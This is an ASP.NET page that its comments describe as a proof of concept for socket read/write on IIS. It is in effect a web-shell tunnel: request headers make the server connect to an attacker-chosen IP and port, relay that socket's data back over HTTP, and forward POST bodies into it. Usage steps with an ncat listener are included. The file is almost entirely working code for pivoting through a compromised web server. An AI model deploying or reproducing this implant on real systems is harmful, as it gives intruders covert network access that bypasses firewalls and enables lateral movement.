<%@ Page Language="C#" Debug="true" ENABLESESSIONSTATE="true"  ValidateRequest="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Web.SessionState" %>
<%@ Import Namespace="System.Web.UI" %>
<%@ Import Namespace="System.Web.Configuration" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>

<script runat="server">
/*
POC for socket read/write on IIS

listening side: ncat -lnvp 1234

1. nop.sh # initialises the session
2. init.sh # warms up the socket and connects
3. listen.sh # listens
4. WAIT 1m40s !! this is important. no idea why it happens, but before that the next step will be delayed.
5. send.sh # sends stuff to the socket BEWARE this needs to timeout at approx. 120. Then it will un-stuck itself and keep working.
*/
static Int32 BUFSIZE = 4096;

public void Page_Load(object sender, EventArgs e)
{
    HttpContext.Current.Response.ContentType = "application/octet-stream";
    Response.ContentEncoding = Encoding.UTF8;
    HttpContext.Current.Response.Write("Hello, world: " + Session["initialised"] + "\n");

    if (Request.Headers["X-Nop"] == "1") {
        // do nothing. dummy event.
        // used when there's no ASP.NET_SessionId set in the headers.
        Session["nop"] = null;
        return;
    }
    if (Request.Headers["X-Init"] == "1") {
        HttpContext.Current.Response.Write("Initialisation started\n");
        var ip = Request.Headers["X-Ip"];
        var port = Convert.ToInt32(Request.Headers["X-Port"]);
        IPAddress ipAddress = IPAddress.Parse(ip); // ipHostInfo.AddressList[0];  
        IPEndPoint remoteEP = new IPEndPoint(ipAddress, port);  
        // option 1: using sockets
        Socket socket;
        socket = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp );
        Session["targetSock"] = socket;
        socket.Connect(remoteEP);
        socket.Send(Encoding.UTF8.GetBytes("Init"));
        // end option 1

        /*
        // option 2: using tcpstreams and streamreaader/streamwriter
        TcpClient socket = new TcpClient(ip, port);
        Session["writer"] = new StreamWriter(socket.GetStream());
        Session["reader"] = new StreamReader(socket.GetStream());
        // end option 2
        */

        /*
        // option 3: trying with network streams..
        System.Net.Sockets.NetworkStream myStream;
        myStream = new NetworkStream(socket);
        Session["myStream"] = myStream;
        // end option 3
        */

        HttpContext.Current.Response.Write("Initialisation ended\n");
        return;
    }

    // start listening
    if (Request.Headers["X-ServerSide"] == "1") {
        // Don't buffer response *VERY IMPORTANT*
        Response.BufferOutput = false;
        int bytesRead;
        byte[] receiveBuffer = new byte[8192];
        HttpContext.Current.Response.Write("Server-side listener loop starting\n");

        // option 1: using sockets
        Socket socket = Session["targetSock"] as Socket;
        try {
            while ((bytesRead = socket.Receive(receiveBuffer)) > 0 ) {
                byte[] received = new byte[bytesRead];
                Array.Copy(receiveBuffer, received , bytesRead);
                Response.BinaryWrite(received);
            }
        } catch(Exception ex){
            HttpContext.Current.Response.Write("[Exception when receiving data from server-side]: "+ ex + "\n");
        }

        /*
        // option 2: using text streams
        StreamReader myStream;
        myStream = Session["reader"] as StreamReader;
        System.IO.Stream webOS = Response.OutputStream;
        char[] receiveCharBuffer = new char[8192];
        int charsRead;
        while ((charsRead = myStream.Read(receiveCharBuffer, 0, receiveCharBuffer.Length)) > 0 ) {
            Response.Write("read " + charsRead + "\n");
            webOS.Write(
                    Encoding.GetEncoding("UTF-8").GetBytes(receiveCharBuffer),
                    0, charsRead);
        }
        // end option 2
        */

        /* ignore
        string line;
        while ((line = myStream.ReadLine()) != null) {
            Response.Write(line);
        }
        */

        /*
        // option 3: using streams
        System.IO.Stream webOS = Response.OutputStream;
        System.Net.Sockets.NetworkStream myStream;
        myStream = Session["myStream"] as System.Net.Sockets.NetworkStream;
        while ((bytesRead = mystream.Read(receiveBuffer, 0, receiveBuffer.Length)) > 0 ) {
            Response.Write("read " + bytesRead + "\n");
            webOS.Write(receiveBuffer, 0, bytesRead);
        }
        */

        HttpContext.Current.Response.Write("Server-side listener stopped\n");
        return;
    } else {
        HttpContext.Current.Response.Write("Sending data to client\n");
        // start writing

        // option 1; using sockets
        Socket socket = Session["targetSock"] as Socket;
        // read from chunkytuna and send over to the server-side socket
        byte[] postData = Request.BinaryRead(Request.TotalBytes);
        if (postData.Length > 0){
            try{
                // socket.Send(Encoding.UTF8.GetBytes("World"));
                socket.Send(postData);
            }
            catch(Exception ex){
                HttpContext.Current.Response.Write("[Exception when sending data] "+ ex + "\n");
            }
        }
        // end option 1

        /*
        // option 2: using text streams (doesn't seem to write anything?)
        StreamWriter myStream;
        myStream = Session["writer"] as StreamWriter;
        myStream.Write("client stuff ");
        // end option 2
        */

        /*
        // option 3: using NetworkStreams
        System.Net.Sockets.NetworkStream myStream;
        myStream = Session["myStream"] as System.Net.Sockets.NetworkStream;
        string hello = "World\n";
        myStream.Write(Encoding.UTF8.GetBytes(hello), 0, hello.Length);
        // TODO myStream.Write(Request...)
        // end option 3
        */
        HttpContext.Current.Response.Write("Done sending data to client\n");
    }
    HttpContext.Current.Response.Write("Goodbye, world\n");
}

</script>

